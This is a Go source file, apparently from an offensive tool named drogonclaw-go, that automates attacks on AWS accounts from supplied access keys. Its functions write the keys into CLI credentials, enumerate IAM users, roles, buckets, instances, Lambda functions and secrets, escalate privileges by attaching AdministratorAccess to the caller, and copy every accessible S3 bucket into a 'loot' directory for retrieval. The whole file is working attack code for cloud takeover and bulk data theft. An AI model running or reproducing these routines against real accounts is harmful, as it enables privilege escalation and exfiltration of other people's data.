package cloud

import (
	"context"
	"fmt"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
)

// ensureAWSCLI makes sure aws-cli is installed and configured in the sandbox.
func ensureAWSCLI(ctx context.Context, accessKey, secretKey string, sb *sandbox.Docker) error {
	installCmd := "if ! command -v aws &> /dev/null; then apt-get update && apt-get install -y awscli; fi"
	if _, err := sb.Execute(ctx, installCmd); err != nil {
		return fmt.Errorf("failed to install aws-cli: %v", err)
	}

	configCmd := fmt.Sprintf(`mkdir -p ~/.aws && cat << EOF > ~/.aws/credentials
[default]
aws_access_key_id = %s
aws_secret_access_key = %s
EOF
cat << EOF > ~/.aws/config
[default]
region = us-east-1
output = json
EOF`, accessKey, secretKey)

	if _, err := sb.Execute(ctx, configCmd); err != nil {
		return fmt.Errorf("failed to configure aws credentials: %v", err)
	}
	return nil
}

// AWSEnumIAM performs a comprehensive IAM enumeration of the current identity:
// caller identity, attached user policies, inline user policies, group memberships,
// group policies, and any assumable roles.
func AWSEnumIAM(ctx context.Context, accessKey, secretKey string, sb *sandbox.Docker) (string, error) {
	if err := ensureAWSCLI(ctx, accessKey, secretKey, sb); err != nil {
		return "", err
	}

	var out strings.Builder

	checks := []struct {
		label string
		cmd   string
	}{
		{
			label: "Caller Identity",
			cmd:   "aws sts get-caller-identity",
		},
		{
			label: "Attached User Policies",
			cmd:   `aws iam list-attached-user-policies --user-name "$(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')" 2>&1`,
		},
		{
			label: "Inline User Policies",
			cmd:   `aws iam list-user-policies --user-name "$(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')" 2>&1`,
		},
		{
			label: "Group Memberships",
			cmd:   `aws iam list-groups-for-user --user-name "$(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')" 2>&1`,
		},
		{
			label: "All IAM Users (if ListUsers allowed)",
			cmd:   "aws iam list-users --query 'Users[*].[UserName,Arn,PasswordLastUsed]' --output table 2>&1",
		},
		{
			label: "All IAM Roles (if ListRoles allowed)",
			cmd:   "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table 2>&1 | head -40",
		},
		{
			label: "S3 Buckets",
			cmd:   "aws s3 ls 2>&1",
		},
		{
			label: "EC2 Instances (us-east-1)",
			cmd:   "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table 2>&1 | head -40",
		},
		{
			label: "Lambda Functions",
			cmd:   "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,LastModified]' --output table 2>&1 | head -30",
		},
		{
			label: "Secrets Manager (if allowed)",
			cmd:   "aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table 2>&1 | head -20",
		},
	}

	for _, c := range checks {
		result, err := sb.Execute(ctx, c.cmd)
		out.WriteString(fmt.Sprintf("=== %s ===\n", c.label))
		if err != nil {
			out.WriteString(fmt.Sprintf("[!] Failed: %v\n", err))
		} else {
			if strings.TrimSpace(result) == "" {
				result = "(no output / access denied)"
			}
			out.WriteString(result + "\n")
		}
		out.WriteString("\n")
	}

	return out.String(), nil
}

// AWSEscalatePrivs attempts AWS privilege escalation by attaching AdministratorAccess.
func AWSEscalatePrivs(ctx context.Context, accessKey string, sb *sandbox.Docker) (string, error) {
	cmd := "aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name $(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $NF}')"
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("privilege escalation failed: %v\nOutput: %s", err, out)
	}
	return fmt.Sprintf("[+] Privilege Escalation Successful.\nOutput: %s", out), nil
}

// AWSDumpS3 enumerates accessible S3 buckets and syncs all content to a local loot directory.
func AWSDumpS3(ctx context.Context, accessKey string, sb *sandbox.Docker) (string, error) {
	buckets, err := sb.Execute(ctx, "aws s3 ls 2>&1")
	if err != nil {
		return "", fmt.Errorf("failed to list buckets: %v", err)
	}

	if strings.TrimSpace(buckets) == "" {
		return "[-] No S3 buckets found or access denied.", nil
	}

	var out strings.Builder
	out.WriteString(fmt.Sprintf("=== Accessible S3 Buckets ===\n%s\n\n", buckets))

	// Parse bucket names and sync each one to /tmp/loot/s3/
	setupCmd := "mkdir -p /tmp/loot/s3"
	if _, err := sb.Execute(ctx, setupCmd); err != nil {
		return "", fmt.Errorf("failed to create loot dir: %v", err)
	}

	// Extract bucket names (format: "YYYY-MM-DD HH:MM:SS bucket-name")
	parseCmd := `aws s3 ls 2>/dev/null | awk '{print $3}'`
	bucketNames, err := sb.Execute(ctx, parseCmd)
	if err != nil || strings.TrimSpace(bucketNames) == "" {
		out.WriteString("[!] Could not parse bucket names for sync.\n")
		return out.String(), nil
	}

	out.WriteString("=== Syncing Bucket Contents ===\n")
	for _, name := range strings.Split(strings.TrimSpace(bucketNames), "\n") {
		name = strings.TrimSpace(name)
		if name == "" {
			continue
		}
		lootPath := fmt.Sprintf("/tmp/loot/s3/%s", name)
		syncCmd := fmt.Sprintf("aws s3 sync s3://%s %s --no-progress 2>&1 | tail -5", name, lootPath)
		syncOut, syncErr := sb.Execute(ctx, syncCmd)
		if syncErr != nil {
			out.WriteString(fmt.Sprintf("[!] %s — sync failed: %v\n", name, syncErr))
		} else {
			out.WriteString(fmt.Sprintf("[+] %s → %s\n%s\n", name, lootPath, syncOut))
		}
	}

	out.WriteString("\n[i] All synced files are in /tmp/loot/s3/ — use download_loot to retrieve them.")
	return out.String(), nil
}
